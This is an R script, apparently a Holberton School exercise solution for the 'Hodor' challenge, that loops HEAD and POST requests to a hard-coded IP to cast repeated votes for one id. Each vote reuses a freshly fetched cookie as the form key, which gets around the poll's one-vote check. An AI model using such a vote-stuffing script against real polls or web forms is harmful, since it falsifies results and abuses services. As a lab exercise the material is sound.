#!/usr/bin/env Rscript

# ===---Description------------------------------------------------------------===
#   Solution for the Hodor Project, Level 1 by Julien Barbier.
#   Using a R Language script with httr library.
#   To run this file install R language and run:
#   $ R -f filename
#
#   by Alexandro de Oliveira, for Holberton School
# ===---------------------------------------------------------------------------===

library('httr')

# Accepting command line arguments:
# args	<- commandArgs(trailingOnly = TRUE)

getCookie = function() {
    head    <- HEAD(url)            # Head request
    cookie  <- cookies(head)$value
    return(cookie)
}

# Defining variables:
url     <- "http://173.246.108.142/level1.php"
count   <- 0
total   <- as.integer(readline("How many votes? => "))

while(count < total) {
    cookie  <-  getCookie()
    body    <- list(id = "23", holdthedoor = "submit", key = cookie)
    header  <- add_headers("User-Agent" = "havk64 R Language Requests")
    p <- POST(url, body = body, encode = "form", header)
    match = headers(p)$`set-cookie`
    if(!is.null(match)) {
        cat(".")
	count <- count + 1
    } else {
        cat("x")
    }
}
cat('\n', "You voted ", total, " times\n")
